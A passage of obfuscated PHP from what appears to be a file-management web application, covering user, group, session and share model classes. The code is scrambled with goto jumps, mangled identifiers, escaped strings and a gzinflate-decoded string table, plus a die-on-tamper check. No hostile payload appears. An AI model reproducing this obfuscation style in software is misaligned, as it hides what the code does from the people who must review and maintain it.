$f‡Íë§ç–‹))->delete(); $A—ß‚‘¾¹ì = array(); goto dÛ˜„ä«ß; dÛ˜„ä«ß: $AùùğÛ‹ì = 0; foreach ($aµ›ÌøâÌ„ as $F§™ŒÉ¸İ¡ => $AÄöÁÖÙš) { $BèŸ„Œ¹¶ = array($FõÉ…³·Ó[1551] => $f‡Íë§ç–‹, $FõÉ…³·Ó[1720] => $F§™ŒÉ¸İ¡, $FõÉ…³·Ó[1820] => $AÄöÁÖÙš); $BèŸ„Œ¹¶[$FõÉ…³·Ó[1743]] = isset($C¤éÁôí‘š[$AùùğÛ‹ì]) ? $C¤éÁôí‘š[$AùùğÛ‹ì] : 0; $AùùğÛ‹ì++; $A—ß‚‘¾¹ì[] = $BèŸ„Œ¹¶; } return $F‹ã›Ò„è->addAll($A—ß‚‘¾¹ì, array(), !0); goto b ƒ‡Ì¼‡˜; b ƒ‡Ì¼‡˜: } protected function userGroupAdd($cÈ‘ŸÍ·áÑ, $e²ê³’ÑŞÙ = array()) { $C©‹áÂ‡„ =& $_SERVER[œÕÊİğö]; $DÜÊÍÉ«‹ù = $this->getInfoSimple($cÈ‘ŸÍ·áÑ); if (!$DÜÊÍÉ«‹ù || empty($e²ê³’ÑŞÙ)) { return !1; } $AÅÌğÉ±Ÿò = array(); foreach ($e²ê³’ÑŞÙ as $AùÔ¢¿ñŞì => $Aë—ƒ»´²) { $AÅÌğÉ±Ÿò[] = array($C©‹áÂ‡„[1551] => $cÈ‘ŸÍ·áÑ, $C©‹áÂ‡„[1720] => $AùÔ¢¿ñŞì, $C©‹áÂ‡„[1820] => $Aë—ƒ»´², $C©‹áÂ‡„[1743] => 0); } return Model($C©‹áÂ‡„[1806])->addAll($AÅÌğÉ±Ÿò, array(), !0); } protected function userGroupRemove($C×ñãÚÍ, $Cğ·³Ğ‘) { $dœäé÷ÈÌ =& $_SERVER[œÕÊİğö]; $dÊ•±ÄÜ’© = $this->getInfoSimple($C×ñãÚÍ); if (!$dÊ•±ÄÜ’© || !$Cğ·³Ğ‘) { return !1; } $Fí¶Í¡îÁŸ = array($dœäé÷ÈÌ[1542] => $C×ñãÚÍ, $dœäé÷ÈÌ[1804] => $Cğ·³Ğ‘); return Model($dœäé÷ÈÌ[1806])->where($Fí¶Í¡îÁŸ)->delete(); } public function listData() { $B‘åß–¬×É = $this->_makeOrder()->selectPage(50); $this->_listDataApply($B‘åß–¬×É[$_SERVER[œÕÊİğö][377]]); return $B‘åß–¬×É; } public function listByID($cÊäîÔ÷öŠ) { goto cÓØâÊë‰; fˆÑ·âĞã: $F£ß¶ÇÈÊ = $this->where($f‹Ò½ã³óš)->select(); $F£ß¶ÇÈÊ = array_sort_keep($F£ß¶ÇÈÊ, $cƒ«‚Ü¾°[1551], $cÊäîÔ÷öŠ); $this->_listDataApply($F£ß¶ÇÈÊ); goto E÷…ÖŒóĞ; cÓØâÊë‰: $cƒ«‚Ü¾° =& $_SERVER[œÕÊİğö]; if (!$cÊäîÔ÷öŠ) { return; } $f‹Ò½ã³óš = array($cƒ«‚Ü¾°[1551] => array($cƒ«‚Ü¾°[7], $cÊäîÔ÷öŠ)); goto fˆÑ·âĞã; E÷…ÖŒóĞ: return $F£ß¶ÇÈÊ; goto FµçÆÃ•Áº; FµçÆÃ•Áº: } public function listByGroup($b‰îù¿•ˆ§ = 0, $eÊ­·Ú‚–§ = array()) { goto BÏ©Æã¥–®; b£’Ñ¬¯²: if ($b‰îù¿•ˆ§) { $a–¨í§”–Š = array($döŒí ¥¶Ü[2182] => intval($b‰îù¿•ˆ§)); $CĞÃ‚¶ïÆ = "\114\x45\106\x54\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\x5f\x67\x72\x6f\165\160\40\165\x73\145\x72\x5f\147\162\x6f\x75\160\40\157\x6e\x20\x75\163\x65\162\56\x75\x73\145\162\x49\x44\40\75\x20\165\163\145\x72\137\x67\162\157\165\x70\56\165\163\x65\x72\111\x44"; $AÊ†ö×ß = Input::get($döŒí ¥¶Ü[458], null, $döŒí ¥¶Ü[43]) ? $döŒí ¥¶Ü[43] : $döŒí ¥¶Ü[2183]; } if (isset($eÊ­·Ú‚–§[$döŒí ¥¶Ü[740]])) { $a–¨í§”–Š[$döŒí ¥¶Ü[2184]] = $eÊ­·Ú‚–§[$döŒí ¥¶Ü[740]]; } $A¥ºŒ›È¦â = $this->_makeOrder($AÊ†ö×ß)->field($döŒí ¥¶Ü[2185])->where($a–¨í§”–Š)->join($CĞÃ‚¶ïÆ)->selectPage(50); goto FÜ¾·æÉ³Í; FÜ¾·æÉ³Í: $this->_listDataApply($A¥ºŒ›È¦â[$döŒí ¥¶Ü[377]]); return $A¥ºŒ›È¦â; goto dƒª¬Ö¿‡Ê; BÏ©Æã¥–®: $döŒí ¥¶Ü =& $_SERVER[œÕÊİğö]; $CĞÃ‚¶ïÆ = $döŒí ¥¶Ü[43]; $a–¨í§”–Š = array(); goto b£’Ñ¬¯²; dƒª¬Ö¿‡Ê: } private function _makeOrder($EÉ‹©Ä“  = '') { goto DÉ”ã¬ä¨ù; DÉ”ã¬ä¨ù: $F‚Ö–®ğ£Œ =& $_SERVER[œÕÊİğö]; $Dí„»–Õ = array($F‚Ö–®ğ£Œ[1551], $F‚Ö–®ğ£Œ[38], $F‚Ö–®ğ£Œ[1706], $F‚Ö–®ğ£Œ[1678], $F‚Ö–®ğ£Œ[204]); $d£ìÊ«Úöä = array($F‚Ö–®ğ£Œ[451] => $F‚Ö–®ğ£Œ[452], $F‚Ö–®ğ£Œ[453] => $F‚Ö–®ğ£Œ[454]); goto Eğ×‹‹™Ù’; Fé¾øÀæ†¿: $EÉ‹©Ä“  = $EÉ‹©Ä“  . "\165\163\x65\162\x2e{$D“ªñÅÓë„}\40{$aÀù…™ÓÙ’}\x2c\40\165\x73\145\162\x2e\x75\163\145\162\111\104\40\x61\x73\143"; return $this->alias($F‚Ö–®ğ£Œ[1927])->order($EÉ‹©Ä“ ); goto FÎºœÜµÅÓ; Eğ×‹‹™Ù’: $D“ªñÅÓë„ = Input::get($F‚Ö–®ğ£Œ[458], $F‚Ö–®ğ£Œ[7], $F‚Ö–®ğ£Œ[1542], $Dí„»–Õ); $aÀù…™ÓÙ’ = Input::get($F‚Ö–®ğ£Œ[459], $F‚Ö–®ğ£Œ[7], $F‚Ö–®ğ£Œ[1807], array($F‚Ö–®ğ£Œ[1807], $F‚Ö–®ğ£Œ[453])); $aÀù…™ÓÙ’ = $d£ìÊ«Úöä[$aÀù…™ÓÙ’]; goto Fé¾øÀæ†¿; FÎºœÜµÅÓ: } public function listSearch($aêäÙ²ôùœ) { goto Cà¾–áÛáÃ; c±ì®óŸÕ: $fŠÂÓÚ¨ = str_replace($d×õâøÓ¡÷[1810], $d×õâøÓ¡÷[1811], trim($fŠÂÓÚ¨)); $añ¹°­¤‚¼ = array($d×õâøÓ¡÷[38] => array($d×õâøÓ¡÷[390], "\x25{$fŠÂÓÚ¨}\x25"), $d×õâøÓ¡÷[313] => array($d×õâøÓ¡÷[390], "{$fŠÂÓÚ¨}\45"), $d×õâøÓ¡÷[1985] => array($d×õâøÓ¡÷[390], "{$fŠÂÓÚ¨}\45"), $d×õâøÓ¡÷[981] => $d×õâøÓ¡÷[1812]); if (Input::check($fŠÂÓÚ¨, $d×õâøÓ¡÷[319])) { $añ¹°­¤‚¼[$d×õâøÓ¡÷[1551]] = array($d×õâøÓ¡÷[390], "{$fŠÂÓÚ¨}\45"); $añ¹°­¤‚¼[$d×õâøÓ¡÷[2166]] = array($d×õâøÓ¡÷[390], "{$fŠÂÓÚ¨}\45"); } goto CšÕ‹­¹¼; CšÕ‹­¹¼: if (!$fŠÂÓÚ¨) { $añ¹°­¤‚¼ = array(); } if (isset($aêäÙ²ôùœ[$d×õâøÓ¡÷[740]])) { $añ¹°­¤‚¼[$d×õâøÓ¡÷[740]] = $aêäÙ²ôùœ[$d×õâøÓ¡÷[740]]; } $añ¹°­¤‚¼ = $this->parseWhereLike($añ¹°­¤‚¼); goto F’áèÆ ƒ¿; Cà¾–áÛáÃ: $d×õâøÓ¡÷ =& $_SERVER[œÕÊİğö]; $fŠÂÓÚ¨ = $aêäÙ²ôùœ[$d×õâøÓ¡÷[1808]]; $DøôÁ¥ÕÑ… = isset($aêäÙ²ôùœ[$d×õâøÓ¡÷[1809]]) ? $aêäÙ²ôùœ[$d×õâøÓ¡÷[1809]] : !1; goto c±ì®óŸÕ; E±¥‰¹Œ‹Ò: $this->_filterByGroup($eµ£±áÎ›„, $DøôÁ¥ÕÑ…); return $eµ£±áÎ›„; goto cñóÁï‚‰; F’áèÆ ƒ¿: $eµ£±áÎ›„ = $this->_makeOrder()->where($añ¹°­¤‚¼)->selectPage(20); if (!$eµ£±áÎ›„ || count($eµ£±áÎ›„[$d×õâøÓ¡÷[377]]) < 5 && Input::check($fŠÂÓÚ¨, $d×õâøÓ¡÷[326])) { $F¬ÊÓ•ÆßÃ = $this->_searchFromMeta($d×õâøÓ¡÷[466], $fŠÂÓÚ¨, 10); $CÛåÂÃ³Ñ˜ = $this->_searchFromMeta($d×õâøÓ¡÷[467], $fŠÂÓÚ¨, 10); $AÄƒõá•Ü = array_merge($F¬ÊÓ•ÆßÃ, $CÛåÂÃ³Ñ˜, $eµ£±áÎ›„[$d×õâøÓ¡÷[377]]); $eµ£±áÎ›„[$d×õâøÓ¡÷[377]] = array_unique_by_key($AÄƒõá•Ü, $d×õâøÓ¡÷[1551]); $eµ£±áÎ›„[$d×õâøÓ¡÷[374]][$d×õâøÓ¡÷[375]] = count($eµ£±áÎ›„[$d×õâøÓ¡÷[377]]); $eµ£±áÎ›„[$d×õâøÓ¡÷[374]][$d×õâøÓ¡÷[376]] = ceil($eµ£±áÎ›„[$d×õâøÓ¡÷[374]][$d×õâøÓ¡÷[375]] / $eµ£±áÎ›„[$d×õâøÓ¡÷[374]][$d×õâøÓ¡÷[371]]); } $this->_listDataApply($eµ£±áÎ›„[$d×õâøÓ¡÷[377]]); goto E±¥‰¹Œ‹Ò; cñóÁï‚‰: } private function _filterByGroup(&$c¤…½±ˆ, $e‡ç›½¾¶) { $e …½‚Ôáµ =& $_SERVER[œÕÊİğö]; if (!$e‡ç›½¾¶) { return $c¤…½±ˆ; } foreach ($c¤…½±ˆ[$e …½‚Ôáµ[377]] as $Dî‡•è–§¿ => &$aŒ‚¸¬Ûº) { $A“ºğÒ’óˆ = array_to_keyvalue($aŒ‚¸¬Ûº[$e …½‚Ôáµ[1897]], $e …½‚Ôáµ[43], $e …½‚Ôáµ[1720]); if (!in_array($e‡ç›½¾¶, $A“ºğÒ’óˆ)) { unset($c¤…½±ˆ[$e …½‚Ôáµ[377]][$Dî‡•è–§¿]); } } unset($aŒ‚¸¬Ûº); $c¤…½±ˆ[$e …½‚Ôáµ[377]] = array_values($c¤…½±ˆ[$e …½‚Ôáµ[377]]); $c¤…½±ˆ[$e …½‚Ôáµ[374]] = array($e …½‚Ôáµ[1959] => count($c¤…½±ˆ[$e …½‚Ôáµ[377]]), $e …½‚Ôáµ[1957] => $c¤…½±ˆ[$e …½‚Ôáµ[374]][$e …½‚Ôáµ[371]], $e …½‚Ôáµ[1956] => 1, $e …½‚Ôáµ[1958] => 1); } private function _searchFromMeta($D¹£ëÃìƒ¨, $c’˜æéÂ», $Bô±¦‘±) { goto f¥¡Ş¤ôª½; EÍ­‰¬ˆÇ¡: return $d­ˆÎæÓÃÀ; goto fÙƒÂÀÚ¸Æ; f¥¡Ş¤ôª½: $dÑœ‰±‹Èï =& $_SERVER[œÕÊİğö]; $c’˜æéÂ» = strtolower($c’˜æéÂ»); $a´‹îÓè‘¸ = array($dÑœ‰±‹Èï[103] => $D¹£ëÃìƒ¨, $dÑœ‰±‹Èï[382] => array($dÑœ‰±‹Èï[390], "\x25{$c’˜æéÂ»}\x25")); goto B µ•ØíÆÓ; C¢ÌëÌÔÖ: $aïíÔ½× š = array_to_keyvalue($aïíÔ½× š, $dÑœ‰±‹Èï[43], $dÑœ‰±‹Èï[1551]); $d­ˆÎæÓÃÀ = $this->where(array($dÑœ‰±‹Èï[1542] => array($dÑœ‰±‹Èï[7], $aïíÔ½× š)))->select(); if (!$d­ˆÎæÓÃÀ) { return array(); } goto EÍ­‰¬ˆÇ¡; B µ•ØíÆÓ: $a´‹îÓè‘¸ = $this->parseWhereLike($a´‹îÓè‘¸); $aïíÔ½× š = Model($dÑœ‰±‹Èï[2186])->where($a´‹îÓè‘¸)->limit($Bô±¦‘±)->select(); if (!$aïíÔ½× š) { return array(); } goto C¢ÌëÌÔÖ; fÙƒÂÀÚ¸Æ: } private function _listDataApplyItem($c‚âé‘À„) { $b¢¿É‹®…Ç = array($c‚âé‘À„); $this->_listDataApply($b¢¿É‹®…Ç); return $b¢¿É‹®…Ç[0]; } private function _listDataApply(&$d¾Õªáâñ) { goto dÊ‚Ë±˜¯ˆ; Bïí…Õºğ²: $this->_listAppendSourceRoot($d¾Õªáâñ, $Fâ¬ •²Ï¥); goto bê‚ˆ­ëË; dÊ‚Ë±˜¯ˆ: $A‚â°¹À‚ =& $_SERVER[œÕÊİğö]; if (!$d¾Õªáâñ) { return; } array_remove_key($d¾Õªáâñ, $A‚â°¹À‚[873]); goto fÄ‚Ğœ¯òµ; fÄ‚Ğœ¯òµ: $Fâ¬ •²Ï¥ = array_to_keyvalue($d¾Õªáâñ, $A‚â°¹À‚[43], $A‚â°¹À‚[1551]); $this->_listAppendGroup($d¾Õªáâñ, $Fâ¬ •²Ï¥); $this->_listAppendMeta($d¾Õªáâñ, $Fâ¬ •²Ï¥); goto Bïí…Õºğ²; bê‚ˆ­ëË: } private function _listAppendSourceRoot(&$aÀï¨’£Æ, $AÌ¶ôŒÀë) { goto A˜˜ĞÏ ”; D­Ï¹Œº±: foreach ($aÀï¨’£Æ as &$D‚ˆÄ®ß) { $D‚ˆÄ®ß[$dÊ…¹—Ã‘È[95]] = $a•ÅƒæÂÇĞ[$D‚ˆÄ®ß[$dÊ…¹—Ã‘È[1551]]] ? $a•ÅƒæÂÇĞ[$D‚ˆÄ®ß[$dÊ…¹—Ã‘È[1551]]] : array(); } unset($D‚ˆÄ®ß); goto cÆƒ´¹ÂÑª; f¾†øÒˆà–: $a•ÅƒæÂÇĞ = $fÎ˜•í–Ú->limit(count($AÌ¶ôŒÀë))->where($FÀŸµÌÔ‹©)->select(); $a•ÅƒæÂÇĞ = array_to_keyvalue($a•ÅƒæÂÇĞ, $dÊ…¹—Ã‘È[507]); $a•ÅƒæÂÇĞ = array_remove_key($a•ÅƒæÂÇĞ, $dÊ…¹—Ã‘È[507]); goto D­Ï¹Œº±; A˜˜ĞÏ ”: $dÊ…¹—Ã‘È =& $_SERVER[œÕÊİğö]; $FÀŸµÌÔ‹© = array($dÊ…¹—Ã‘È[501] => 0, $dÊ…¹—Ã‘È[507] => array($dÊ…¹—Ã‘È[7], $AÌ¶ôŒÀë), $dÊ…¹—Ã‘È[415] => SourceModel::TYPE_USER); $fÎ˜•í–Ú = Model($dÊ…¹—Ã‘È[822])->order($dÊ…¹—Ã‘È[1818])->field($dÊ…¹—Ã‘È[1819]); goto f¾†øÒˆà–; cÆƒ´¹ÂÑª: } private function _listAppendGroup(&$bÆÌ–ÍÌºØ, $e¥Â†¦ŒÖ) { goto BçÙŞ†ˆŸ; f”ìé½£ìô: foreach ($bÆÌ–ÍÌºØ as &$eÊÇïáğ‹Ó) { $eÊÇïáğ‹Ó[$Dµ‡Ø§¹”‰[1897]] = array(); if (isset($D«ÒØí›[$eÊÇïáğ‹Ó[$Dµ‡Ø§¹”‰[1551]]])) { $eÊÇïáğ‹Ó[$Dµ‡Ø§¹”‰[1897]] = $D«ÒØí›[$eÊÇïáğ‹Ó[$Dµ‡Ø§¹”‰[1551]]]; } } unset($eÊÇïáğ‹Ó); goto bãˆØéÑÔÈ; a£ÌÇ‹ò…Œ: $FÏ®Î¯¨¯— = array_to_keyvalue($D«ÒØí›, $Dµ‡Ø§¹”‰[43], $Dµ‡Ø§¹”‰[1720]); $FÏ®Î¯¨¯— = array_remove_value(array_unique($FÏ®Î¯¨¯—), $Dµ‡Ø§¹”‰[201]); if (!$FÏ®Î¯¨¯— || !$D«ÒØí›) { return; } goto DåŠë•Õ‡; BçÙŞ†ˆŸ: $Dµ‡Ø§¹”‰ =& $_SERVER[œÕÊİğö]; $aˆùÍÏÊ¬‰ = array($Dµ‡Ø§¹”‰[1551] => array($Dµ‡Ø§¹”‰[7], $e¥Â†¦ŒÖ)); $D«ÒØí› = Model($Dµ‡Ø§¹”‰[1806])->where($aˆùÍÏÊ¬‰)->select(); goto a£ÌÇ‹ò…Œ; fæ‚›ŒÍï: $D«ÒØí› = array_to_keyvalue_group($D«ÒØí›, $Dµ‡Ø§¹”‰[1551]); foreach ($D«ÒØí› as &$f¸„Ÿ©Îß) { $bë›ĞÀ•‚Ğ = array(); foreach ($f¸„Ÿ©Îß as $bÆ´â†ó¦´) { if (!$bÆ´â†ó¦´[$Dµ‡Ø§¹”‰[1820]]) { continue; } $E«Àöõ¤‰¯ = Model($Dµ‡Ø§¹”‰[510])->listData($bÆ´â†ó¦´[$Dµ‡Ø§¹”‰[1820]]); $bë›ĞÀ•‚Ğ[] = array($Dµ‡Ø§¹”‰[1720] => $bÆ´â†ó¦´[$Dµ‡Ø§¹”‰[1720]], $Dµ‡Ø§¹”‰[2188] => $Dì£Ñ§½Ô[$bÆ´â†ó¦´[$Dµ‡Ø§¹”‰[1720]]][$Dµ‡Ø§¹”‰[38]], $Dµ‡Ø§¹”‰[524] => $Dì£Ñ§½Ô[$bÆ´â†ó¦´[$Dµ‡Ø§¹”‰[1720]]][$Dµ‡Ø§¹”‰[524]], $Dµ‡Ø§¹”‰[417] => $E«Àöõ¤‰¯); } $f¸„Ÿ©Îß = $bë›ĞÀ•‚Ğ; } unset($f¸„Ÿ©Îß); goto f”ìé½£ìô; DåŠë•Õ‡: $aˆùÍÏÊ¬‰ = array($Dµ‡Ø§¹”‰[1720] => array($Dµ‡Ø§¹”‰[7], $FÏ®Î¯¨¯—)); $Dì£Ñ§½Ô = Model($Dµ‡Ø§¹”‰[1895])->field($Dµ‡Ø§¹”‰[2187])->where($aˆùÍÏÊ¬‰)->select(); $Dì£Ñ§½Ô = array_to_keyvalue($Dì£Ñ§½Ô, $Dµ‡Ø§¹”‰[1720]); goto fæ‚›ŒÍï; bãˆØéÑÔÈ: } public function userAppendGroup($bò²å’­‚Š) { $aˆŞÚÑÂÈ =& $_SERVER[œÕÊİğö]; if (!$bò²å’­‚Š) { return array(); } $this->_listAppendGroup($bò²å’­‚Š, array_to_keyvalue($bò²å’­‚Š, $aˆŞÚÑÂÈ[43], $aˆŞÚÑÂÈ[1551])); return $bò²å’­‚Š; } private function _listAppendMeta(&$Dë‡™–Ö, $CÜóÖàŠ‡) { goto aáš²‰‰; D‡½‚·É’: foreach ($Cí«Şéƒ“… as &$aÔ‹îº¤°Ø) { $dÙÓ‡¬±Ú« = array(); foreach ($aÔ‹îº¤°Ø as $få…Ç¼–ŠÕ) { if (!in_array($få…Ç¼–ŠÕ[$FõãÆ¥à­è[103]], $c’Áõ—È)) { $dÙÓ‡¬±Ú«[$få…Ç¼–ŠÕ[$FõãÆ¥à­è[103]]] = $få…Ç¼–ŠÕ[$FõãÆ¥à­è[382]]; } } $aÔ‹îº¤°Ø = $dÙÓ‡¬±Ú«; } unset($aÔ‹îº¤°Ø); $a½†‹¢··ª = Model($FõãÆ¥à­è[2189]); goto aùñŒŸªÛ¼; aáš²‰‰: $FõãÆ¥à­è =& $_SERVER[œÕÊİğö]; $A•Ç—ÏÂãë = UserJobModel::JOB_KEY; $c’Áõ—È = array($FõãÆ¥à­è[2167]); goto f•‹Ï£ØÄ; f•‹Ï£ØÄ: $BíÖ¶ÕÙª’ = array($FõãÆ¥à­è[1551] => array($FõãÆ¥à­è[7], $CÜóÖàŠ‡)); $Cí«Şéƒ“… = Model($FõãÆ¥à­è[2165])->where($BíÖ¶ÕÙª’)->select(); $Cí«Şéƒ“… = array_to_keyvalue_group($Cí«Şéƒ“…, $FõãÆ¥à­è[1551]); goto D‡½‚·É’; aùñŒŸªÛ¼: foreach ($Dë‡™–Ö as &$D°˜áÀÜ—À) { $EÒ¼§ò¸îî = array(); if (isset($Cí«Şéƒ“…[$D°˜áÀÜ—À[$FõãÆ¥à­è[1551]]])) { $EÒ¼§ò¸îî = $Cí«Şéƒ“…[$D°˜áÀÜ—À[$FõãÆ¥à­è[1551]]]; } $D°˜áÀÜ—À[$FõãÆ¥à­è[2190]] = array(); if (isset($EÒ¼§ò¸îî[$A•Ç—ÏÂãë])) { $D°˜áÀÜ—À[$FõãÆ¥à­è[2190]] = $a½†‹¢··ª->getUserJobInfo($EÒ¼§ò¸îî[$A•Ç—ÏÂãë]); } } unset($D°˜áÀÜ—À); goto D¡…‡ºÂ„; D¡…‡ºÂ„: } protected function groupUserAll($e“ë‰¼š) { $c«ÏÚÇ ì¨ =& $_SERVER[œÕÊİğö]; if (!$e“ë‰¼š) { return !1; } $BÆ¡á„ÓÑ = Model($c«ÏÚÇ ì¨[1806])->field($c«ÏÚÇ ì¨[1551])->where(array($c«ÏÚÇ ì¨[1720] => array($c«ÏÚÇ ì¨[7], $e“ë‰¼š)))->select(); $BÆ¡á„ÓÑ = array_to_keyvalue($BÆ¡á„ÓÑ, $c«ÏÚÇ ì¨[43], $c«ÏÚÇ ì¨[1551]); return array_unique($BÆ¡á„ÓÑ); } public function userSearch($EºĞ§¡ŒĞ¾, $DŞ¥í†Şº‚ = "\x2a") { return Model($_SERVER[œÕÊİğö][541])->where($EºĞ§¡ŒĞ¾)->field($DŞ¥í†Şº‚)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\x72\x5f\157\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($déç’¡ğÙô) { $c°Ëìáö·ø =& $_SERVER[œÕÊİğö]; if (!defined($c°Ëìáö·ø[477])) { define($c°Ëìáö·ø[477], 0); } return "\125\x73\x65\162\117\x70\164\x69\157\x6e\x5f{$déç’¡ğÙô}\137" . USER_ID; } protected function filterWhere($BÙáÙ–Üœ) { $aÁËÜÙ–øİ =& $_SERVER[œÕÊİğö]; if (!defined($aÁËÜÙ–øİ[477])) { define($aÁËÜÙ–øİ[477], 0); } $BÙáÙ–Üœ[$aÁËÜÙ–øİ[1551]] = USER_ID; return $BÙáÙ–Üœ; } public function cacheRemoveUser($c©õÎ£¿á, $E´¿ãÂƒÜÅ) { return Cache::remove("\125\163\x65\x72\117\160\164\x69\157\x6e\137{$c©õÎ£¿á}\x5f" . $E´¿ãÂƒÜÅ); } protected function optionDefault($f§êœ³…º = '') { $f‰ÒĞ†ô®½ =& $_SERVER[œÕÊİğö]; if ($f§êœ³…º == $f‰ÒĞ†ô®½[43]) { return $GLOBALS[$f‰ÒĞ†ô®½[6]][$f‰ÒĞ†ô®½[2191]]; } if ($f§êœ³…º == $f‰ÒĞ†ô®½[2192]) { return $GLOBALS[$f‰ÒĞ†ô®½[6]][$f‰ÒĞ†ô®½[2193]]; } } } goto aÍ¡Ï¶£ô»; A±¡±ÊÁò: if (strlen($c¸š’›’») < $_SERVER[œÕÊİğö][16]) { die; } $_SERVER[õÒ³è´] = explode($_SERVER[œÕÊİğö][610], gzinflate(substr($_SERVER[œÕÊİğö][611], 10, -8))); $E“İĞøŞ†˜ = $_SERVER[œÕÊİğö][612]; goto CÊêÀ‹›¦Å; C”—·ÉÉÓô: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\163\x65\x73\163\151\157\156"; public function get($D®¤ëçÖ•é) { $Fóè“¢˜ =& $_SERVER[œÕÊİğö]; $BÏìëšÀŸ = $this->where(array($Fóè“¢˜[1849] => $D®¤ëçÖ•é))->find(); if (!is_array($BÏìëšÀŸ)) { return !1; } return $BÏìëšÀŸ[$Fóè“¢˜[745]]; } public function set($CÖ˜ğ¯„°, $E£Âò•§Ô‘, $f­õ ”óïÉ = 3600) { $A­Û•Í»Ù =& $_SERVER[œÕÊİğö]; $Eğ’ÙîÍğ® = array($A­Û•Í»Ù[1849] => $CÖ˜ğ¯„°, $A­Û•Í»Ù[1758] => $E£Âò•§Ô‘, $A­Û•Í»Ù[1850] => $f­õ ”óïÉ + time()); if (Session::get($A­Û•Í»Ù[1851])) { $Eğ’ÙîÍğ®[$A­Û•Í»Ù[1551]] = Session::get($A­Û•Í»Ù[1851]); } else { $Eğ’ÙîÍğ®[$A­Û•Í»Ù[1551]] = 0; } if ($this->get($CÖ˜ğ¯„°)) { return $this->where(array($A­Û•Í»Ù[1849] => $CÖ˜ğ¯„°))->save($Eğ’ÙîÍğ®); } else { return $this->add($Eğ’ÙîÍğ®, array(), !0); } } public function remove($Eß±å¯Í‡Á) { return $this->where(array($_SERVER[œÕÊİğö][1849] => $Eß±å¯Í‡Á))->delete(); } public function clearTimeout() { return $this->where($_SERVER[œÕÊİğö][1852] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\151\x6d\x65", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74\x2c\165\x70\144\x61\164\145", "\x66\165\156\x63\164\x69\157\156"), array("\143\x72\x65\141\164\145\124\x69\155\x65", "\164\151\155\145", "\x69\x6e\x73\145\162\x74", "\146\x75\x6e\143\164\x69\x6f\156"), array("\157\x70\164\151\x6f\156\163", '', "\151\156\x73\145\162\164\x2c\165\x70\x64\141\164\x65\54\x73\x65\x6c\x65\x63\164", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($F£¸‘ÚÂç) { $BÚ¹ø‰„Ò› =& $_SERVER[œÕÊİğö]; $Cµ–Å”šÑ = isset($F£¸‘ÚÂç[0]) ? $F£¸‘ÚÂç[0] : !1; return array($BÚ¹ø‰„Ò›[1853] => array(USER_ID, $BÚ¹ø‰„Ò›[1854]), $BÚ¹ø‰„Ò›[1796] => array($Cµ–Å”šÑ, $BÚ¹ø‰„Ò›[1855])); } protected function listSimple() { $A¸¨ƒÇ‹—Í = array($_SERVER[œÕÊİğö][1551] => USER_ID); $A®Æ±ŒÊ = $this->field($this->fieldList)->where($A¸¨ƒÇ‹—Í)->select(); return $A®Æ±ŒÊ ? $A®Æ±ŒÊ : array(); } protected function getInfo($aÕó»„Ç»Ì, $C’¢è î± = false) { $e†¼šó‘°˜ =& $_SERVER[œÕÊİğö]; if ($C’¢è î±) { return $this->_getShareInfo(array($e†¼šó‘°˜[491] => $aÕó»„Ç»Ì)); } $E‚¿á÷× = $this->cacheFunctionGet($e†¼šó‘°˜[1798], $aÕó»„Ç»Ì); return $E‚¿á÷×; } public function getInfoByHash($eï¤ò»ÁÊ´) { return $this->_getShareInfo(array($_SERVER[œÕÊİğö][493] => $eï¤ò»ÁÊ´)); } public function getInfoByPath($F¬ ‡ËÎ–) { $DÑŠóÍŠŠ =& $_SERVER[œÕÊİğö]; $D·¶£Ïá²« = array($DÑŠóÍŠŠ[1551] => USER_ID, $DÑŠóÍŠŠ[406] => $F¬ ‡ËÎ–); return $this->_getShareInfo($D·¶£Ïá²«); } public function getInfoBySourcePath($cƒ‰‹‹İ) { $E‘‡Ü†çİ¢ =& $_SERVER[œÕÊİğö]; $CˆÆóƒ„ŠÓ = array($E‘‡Ü†çİ¢[1551] => USER_ID, $E‘‡Ü†çİ¢[1093] => $cƒ‰‹‹İ); return $this->_getShareInfo($CˆÆóƒ„ŠÓ); } private function _getShareInfo($fÍö×½ë®â) { goto f„²±Ò•¯Œ; f„²±Ò•¯Œ: $dİø°“¹‘ =& $_SERVER[œÕÊİğö]; $DÖÁ—¤¤Ú = $this->where($fÍö×½ë®â)->find(); if (!$DÖÁ—¤¤Ú) { return !1; } goto a® ¹•®Í­; a® ¹•®Í­: $fÍö×½ë®â = array($dİø°“¹‘[491] => $DÖÁ—¤¤Ú[$dİø°“¹‘[491]]); $C¶ƒ¼øµÚØ = $dİø°“¹‘[1856]; $cÖÚî‰šÇ× = Model($dİø°“¹‘[599])->order($dİø°“¹‘[404])->field($C¶ƒ¼øµÚØ)->where($fÍö×½ë®â)->select(); goto eÇ¾á×¸†; eÇ¾á×¸†: if ($DÖÁ—¤¤Ú[$dİø°“¹‘[406]] == $dİø°“¹‘[201]) { $DÖÁ—¤¤Ú[$dİø°“¹‘[95]] = IO::info($DÖÁ—¤¤Ú[$dİø°“¹‘[1093]]); } else { $DÖÁ—¤¤Ú[$dİø°“¹‘[95]] = Model($dİø°“¹‘[1228])->pathInfo($DÖÁ—¤¤Ú[$dİø°“¹‘[406]]); } $DÖÁ—¤¤Ú[$dİø°“¹‘[1857]] = $cÖÚî‰šÇ×; return $DÖÁ—¤¤Ú; goto a¥’‹åë¦; a¥’‹åë¦: } protected function getInfoAuth($AÇ¬®ä„Ùí) { $fô°ùÊ´Å¾ =& $_SERVER[œÕÊİğö]; $aÂ…¤ÍŠÅÔ = $this->getInfo($AÇ¬®ä„Ùí); $aÂ…¤ÍŠÅÔ[$fô°ùÊ´Å¾[417]] = Model($fô°ùÊ´Å¾[505])->authMake($aÂ…¤ÍŠÅÔ[$fô°ùÊ´Å¾[1857]]); return $aÂ…¤ÍŠÅÔ; } protected function listData($cƒ·•ãÏ·Æ = null, $cš±…Ã¥¸ = 300) { $C¢ó­¸ç£ô =& $_SERVER[œÕÊİğö]; $AŞÃƒÍ§ó— = array(array($C¢ó­¸ç£ô[496] => array($C¢ó­¸ç£ô[993], 0), $C¢ó­¸ç£ô[498] => 